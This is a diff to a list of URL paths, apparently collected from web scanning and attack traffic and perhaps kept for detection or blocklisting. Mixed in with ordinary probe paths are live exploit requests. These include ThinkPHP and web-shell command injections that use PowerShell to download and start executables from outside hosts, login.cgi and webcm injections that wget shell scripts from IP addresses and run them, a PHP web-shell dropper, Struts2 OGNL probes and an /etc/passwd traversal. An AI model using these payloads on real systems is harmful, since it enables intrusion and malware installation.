@@ -1,4 +1,3 @@
-
 //
 /__$$ND_FUNC$$_
 /0/
@@ -13,7 +12,10 @@
 /123.php
 /12.php
 /?_=156260bc58753
+/?_=156261acf8753
+/?_=156262cc28753
 /?_=156264355f559
+/?_=15626b3238258
 /?_=15626d72d7b57
 /?_=15626dcca8753
 /1hou.php
@@ -132,6 +134,8 @@
 /admin/backup/
 /admin.cfm
 /admin/CiscoAdmin.jhtml
+//admin/config.php
+/admin/config.php
 /admin/content/sitetree/
 /admincontrol.asp
 /admincontrol.aspx
@@ -616,6 +620,7 @@
 /cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd
 /cgi-bin/nobody/Machine.cgi?action=get_capability
 /cgi-bin/vcs
+/cgi-bin/webcm?getpage=../html/menus/menu2.html&var:lang=%26%20wget%20http://91.92.66.192/xd.sh%20%26
 /cgi.cgi/
 /cgi-csc/
 /cgi-exe/
@@ -1179,6 +1184,9 @@
 /.htpasswd
 /http/
 http://110.249.212.46/testget?q=23333&port=80
+http://191.162.202.241:8828/
+http://191.162.202.241:8828/nksgenewxtpjylj714i5wmzdl93kv8daq0k9
+http://27.33.46.53/index.php?q=0FdIH3hkXHxxf96t2BG5zWc7JGZ8XQSnGfPVFdhy_cAKashG-v982XyrgRboedXib410oyx9K98ES5VaCPlJEg
 http://5.188.210.101/echo.php
 /https/
 /hudson/script
@@ -1291,6 +1299,7 @@ http://5.188.210.101/echo.php
 /JBookIt/
 /?jcb=test
 /jdbc/
+/jira/secure/ContactAdministrators!default.jspa
 /jmx-console/
 /job/
 /jobhistory
@@ -1384,6 +1393,8 @@ http://5.188.210.101/echo.php
 /login.action/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f
 /login.action?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest
 /login.asp
+/login.cgi?cli=aa%20aa%27;wget%20http://158.255.5.216/t%20-O%20-%3E%20/tmp/t;sh%20/tmp/t%27$
+/login.cgi?cli=aa%20aa%27;wget%20http://54.37.74.232/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$
 /login.do
 /login.do/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f
 /login.do?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest
@@ -1431,6 +1442,7 @@ http://5.188.210.101/echo.php
 /manager/
 /Manager/
 /manager/html
+/manager/text/list
 /manual/
 /map/
 /mappings/
@@ -2096,8 +2108,13 @@ http://5.188.210.101/echo.php
 /public/
 /publica/
 /publicar/
+/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/rayayxitmzywiit1214.exe');start%20%SystemRoot%/Temp/rayayxitmzywiit1214.exe
+/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://wiu.fxxxxxxk.me/download.exe','%SystemRoot%/Temp/rsgfevutwykihuf29993.exe');start%20%SystemRoot%/Temp/rsgfevutwykihuf29993.exe
 /public/index.php
 /public/index.php?s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=shell_exec&vars%5B1%5D%5B0%5D=wget+http%3A%2F%2F176.162.141.99%2Fphpmyadmin%2Fctrl.php%3Fadd_ip
+/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/rayayxitmzywiit1214.exe');start%20%SystemRoot%/Temp/rayayxitmzywiit1214.exe
+/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://wiu.fxxxxxxk.me/download.exe','%SystemRoot%/Temp/rsgfevutwykihuf29993.exe');start%20%SystemRoot%/Temp/rsgfevutwykihuf29993.exe
+/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
 /publico/
 /publish/
 /purchase/
@@ -2184,7 +2201,10 @@ http://5.188.210.101/echo.php
 /robots/
 /robots.txt
 /robots.txt?_=156260bc58753
+/robots.txt?_=156261acf8753
+/robots.txt?_=156262cc28753
 /robots.txt?_=156264355f559
+/robots.txt?_=15626b3238258
 /robots.txt?_=15626d72d7b57
 /robots.txt?_=15626dcca8753
 /rom-0
@@ -2230,6 +2250,7 @@ http://5.188.210.101/echo.php
 /secret/
 /sections/reference.inc.php
 /secure/
+/secure/ContactAdministrators!default.jspa
 /secured/
 /security/
 /sell/
@@ -2354,6 +2375,7 @@ http://5.188.210.101/echo.php
 /Ss.php
 /sss.php
 /staff/
+/stat
 /stat/
 /state/
 /statistic/
@@ -2364,6 +2386,7 @@ http://5.188.210.101/echo.php
 /stats-bin-p/
 /stats/index.php?sort=%7B%24%7B%64%69%65%28%6D%64%35%28%44%49%52%45%43%54%4F%52%59%5F%53%45%50%41%52%41%54%4F%52%29%29%7D%7D
 /stats_old/
+/status
 /status/
 /status?full=true
 /statusnet/
@@ -2503,6 +2526,7 @@ http://5.188.210.101/echo.php
 /u02/
 /ua/Thumbr.php?ftp%3A%2F%2Fet%3Aet%40et_fea_kpi_ua%2FThumbr_php%3F=
 /ucs/
+/ui
 /unauthenticated/provisioning/
 /undx.php
 /unix/
